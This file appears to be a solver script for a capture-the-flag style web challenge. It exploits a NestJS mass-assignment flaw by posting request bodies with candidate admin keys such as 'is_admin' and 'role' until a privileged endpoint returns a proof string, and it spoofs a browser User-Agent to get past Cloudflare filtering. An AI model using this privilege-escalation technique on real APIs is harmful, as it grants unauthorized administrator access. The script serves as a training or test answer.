#!/usr/bin/env python3
"""
Mass-assignment solver for Profile Binder (NestJS "Posted Too Much" family).

Flow:
  1. GET /api/clues -> {feature_route, secondary_route, current_role}
  2. POST feature_route with a body that includes an unvalidated
     privilege-escalation property (the DTO has no whitelist/forbid
     of extra properties, so arbitrary keys get bound onto the
     server-side entity even though the response DTO only ever
     echoes a fixed {"display_name": "Learner"}).
  3. GET secondary_route -> once a privileged property has been bound,
     it returns {"ok": true, "effect": "bound_privileged_property",
     "evidence": "proof_<hex>"} instead of 403 administrator_required.

Usage:
  python3 solve.py <base_url>
Prints the recovered proof string to stdout.
"""
import json
import sys
import time
import urllib.request


# Cloudflare rejects the default "Python-urllib/x.y" UA (error 1010).
UA = "Mozilla/5.0 (X11; Linux x86_64) web-worker-solver/1.0"


def post_json(url, body, timeout=15):
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        url, data=data, method="POST",
        headers={"Content-Type": "application/json", "User-Agent": UA},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


def get_json(url, timeout=15):
    req = urllib.request.Request(url, method="GET", headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read())


# Candidate privileged-property names/values a NestJS DTO without
# whitelist:true/forbidNonWhitelisted might silently bind onto the
# entity despite only ever echoing display_name back to the client.
CANDIDATES = [
    {"name": "solver", "is_admin": True},
    {"name": "solver", "promote": True},
    {"name": "solver", "promoted": True},
    {"name": "solver", "level": "admin"},
    {"name": "solver", "access": "admin"},
    {"name": "solver", "role": {"name": "admin"}},
    {"name": "solver", "role": "admin"},
    {"name": "solver", "admin": True},
    {"name": "solver", "isAdmin": True},
]


def solve(base_url):
    base_url = base_url.rstrip("/")
    status, clues = get_json(f"{base_url}/api/clues")
    feature_route = clues["feature_route"]
    secondary_route = clues["secondary_route"]

    for body in CANDIDATES:
        post_json(f"{base_url}{feature_route}", body)
        time.sleep(0.75)
        status, result = get_json(f"{base_url}{secondary_route}")
        if status == 200 and "evidence" in result:
            return result["evidence"]
    raise RuntimeError("no candidate property bound admin privilege")


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else ""
    if not base:
        print("usage: solve.py <base_url>", file=sys.stderr)
        sys.exit(1)
    print(solve(base))
